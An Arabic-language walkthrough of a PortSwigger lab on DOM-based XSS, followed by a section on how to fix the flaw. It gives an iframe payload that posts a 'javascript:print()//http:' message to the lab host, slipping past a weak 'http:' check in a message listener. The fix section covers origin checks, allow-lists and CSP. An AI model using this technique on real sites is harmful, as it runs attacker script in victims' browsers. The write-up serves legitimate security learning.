# [DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)

## **`الهدف`**
قم بإنشاء صفحة `HTML` على سيرفر الاستغلال تستغل ثغرة `DOM-based redirection`  التي تُفعل بواسطة `Web Messaging` وتستدعي دالة `print()`.
## **`خطوات الحل`**
سنقوم بالدخول إلى السيرفر الخاص بنا الذي يوفره اللاب ونضع السكريبت التالي في خانة `Body`.
```html
<iframe src="https://0aa000360301918f82268d5c00480023.web-security-academy.net" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"></iframe>
```
بعد ذلك نقوم بالضغط على `Store` ثم `Deliver exploit to victim` لننتهي من حل اللاب. 
## **`ترقيع الثغرة`**
يجب التوقف عن تمرير المدخلات القادمة من المستخدم عبر رسائل الويب `Web Messages` وتحديداً من `event.data` مباشرة إلى مصبات إعادة التوجيه غير الآمنة `Sinks` مثل `location.href` بالاعتماد على فحوصات نصية ضعيفة (مثل التحقق من مجرد وجود كلمة `http:`)، واستبدالها بواجهات `DOM` الآمنة مثل كائن `URL` لتحليل الرابط برمجياً.

ويجب التحقق من مصدر أي بيانات ديناميكية يتم استلامها عبر المستمع `EventListener` قبل معالجتها، وذلك باستخدام خاصية `event.origin` لضمان قدومها من نطاق موثوق، إلى جانب فحص المدخلات لضمان أن بروتوكول الرابط (`Protocol`) هو بروتوكول ويب آمن (مثل `https:`) ولا يمكن للمتصفح تفسيره كـ `Payload` خبيث.

وإذا كان الهدف هو مجرد توجيه المستخدم إلى صفحة معينة بناءً على الرسالة، فيجب على المبرمجين الاعتماد على `Whitelists` والتي تقارن المدخلات بمسارات موثوقة ومحددة مسبقاً، وتمنع تفعيل أي مخططات خبيثة مثل `javascript:`.

وكطبقة حماية إضافية، يجب على السيرفر إرسال ترويسة سياسة أمان المحتوى `CSP` صارمة تمنع تنفيذ أكواد `JS` المدمجة عبر الروابط (`javascript: URIs`)، فحتى لو فشل المطور في تأمين الكود برمجياً ونجح المهاجم في حقن الرابط الخبيث، سيتدخل المتصفح ويمنع تنفيذ الـ `print()`.
